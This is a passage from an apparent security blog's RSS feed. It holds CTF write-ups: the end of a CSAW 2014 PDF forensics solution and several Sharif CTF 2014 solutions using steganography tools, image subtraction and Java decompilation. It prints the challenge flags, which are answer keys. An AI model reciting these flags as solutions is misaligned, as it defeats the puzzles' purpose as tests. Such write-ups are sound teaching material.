&lt;hr /&gt;
&lt;h2&gt;Finding the Second Hex-encoded String: Approach II&lt;/h2&gt;
&lt;p&gt;There is a nice tool called &lt;a href="http://qpdf.sourceforge.net/"&gt;qpdf&lt;/a&gt; that can be very useful here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudp yum install qpdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we just do the following conversion:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;qpdf  --qdf  announcement.pdf  unpacked.pdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opening &lt;em&gt;unpacket.pdf&lt;/em&gt; with &lt;a href="http://tarot.freeshell.org/leafpad/"&gt;l3afpad&lt;/a&gt; also leads to the flag :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;stream&lt;/span&gt;
&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="n"&gt;endstream&lt;/span&gt;
&lt;span class="n"&gt;endobj&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Sun, 28 Sep 2014 11:21:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-28:csaw-ctf-2014-forensics-300-fluffy-no-more.html</guid><category>CTF</category><category>CSAW</category><category>hashcat</category><category>pdf-parser</category><category>qpdf</category><category>LAMP</category><category>JavaScript</category></item><item><title>The Sharif University CTF 2014</title><link>http://bt3gl.github.io/the-sharif-university-ctf-2014.html</link><description>&lt;p&gt;It looked like a fun CTF, but I did not have the chance to play for too long. I managed to solve a few problems in the morning and the solutions are bellow.&lt;/p&gt;
&lt;h2&gt;Avatar: Steganography&lt;/h2&gt;
&lt;p&gt;The challenge starts with:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A terrorist has changed his picture in a social network. What is the hidden message?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And the following image:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/6NIu64us.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;For this problem, I use &lt;a href="http://www.outguess.org/download.php"&gt;OutGuess&lt;/a&gt;, which can be installed as:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -zxvf outguess-0.2.tar.gz
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;outguess
&lt;span class="nv"&gt;$ &lt;/span&gt;./configure &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it will give us the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./outguess -r lamb.jpg pass.txt
Reading ../lamb.jpg....
Extracting usable bits:   28734 bits
Steg retrieve: seed: 94, len: 41
&lt;span class="nv"&gt;$ &lt;/span&gt;cat pass.txt
We should blow up the bridge at midnight
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;What is this: Steganography&lt;/h2&gt;
&lt;p&gt;This challenge has a very short text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Find the flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Together with two pictures:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/sbSwBju.jpg" /&gt;
&lt;img alt="" src="http://i.imgur.com/mpcIKWt.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;After the usual inspection (tail, file, diff, compare), I applied my knowledge of a former astrophysicist to inspect what would happen if I added or subtracted the picture. I wrote the following script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scipy.misc&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;imread&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;imsave&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;compare_images&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;img2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;diff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;img1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;img2&lt;/span&gt;
    &lt;span class="n"&gt;imsave&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;sum.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;diff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;diff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;img1&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;img2&lt;/span&gt;
    &lt;span class="n"&gt;imsave&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;diff.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;diff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;file1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;img1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;float&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;img2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;float&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;compare_images&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;img2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it, give us the flag!&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mvj8OJl.png" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Guess the number: Reverse Engineering&lt;/h2&gt;
&lt;p&gt;This problem starts with another not very informative text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Guess the number and find the flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then it gives us a &lt;em&gt;java class&lt;/em&gt; file. It was clear that we needed to decompile it. I'm using
&lt;a href="http://varaneckas.com/jad/"&gt;jad&lt;/a&gt;for this task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;jad guess.class
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, opening this file in a text editor, we can see how to generate the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;```&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;
&lt;span class="c1"&gt;// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.&lt;/span&gt;
&lt;span class="c1"&gt;// Jad home page: http://www.geocities.com/kpdus/jad.html&lt;/span&gt;
&lt;span class="c1"&gt;// Decompiler options: packimports(3)&lt;/span&gt;
&lt;span class="c1"&gt;// Source File Name:   guess.java&lt;/span&gt;

&lt;span class="o"&gt;(...)&lt;/span&gt;
&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;str_one&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;4b64ca12ace755516c178f72d05d7061&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;str_two&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ecd44646cfe5994ebeb35bf922e25dba&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;XOR&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str_one&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;str_two&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;your flag is: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;append&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;answer&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running the modified version gives us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;$&lt;/span&gt; &lt;span class="n"&gt;javac&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt; &lt;span class="n"&gt;guess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;java&lt;/span&gt;
&lt;span class="n"&gt;$&lt;/span&gt; &lt;span class="n"&gt;java&lt;/span&gt; &lt;span class="n"&gt;guess&lt;/span&gt;
&lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="nl"&gt;is:&lt;/span&gt; &lt;span class="n"&gt;a7b08c546302cc1fd2a4d48bf2bf2ddb&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Sudoku image encryption - cryptography&lt;/h2&gt;
&lt;p&gt;This challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Row Major Order&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And it gives us two pictures: a map and a sudoku. Solving the sudoku leads to the flag:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/nNMm64M.png" /&gt;
&lt;img alt="" src="http://i.imgur.com/1IXD8tIs.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Hack all the things! &lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Fri, 26 Sep 2014 04:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-26:the-sharif-university-ctf-2014.html</guid><category>CTF</category><category>Steganography</category><category>jad</category><category>OutGuess</category></item></channel></rss>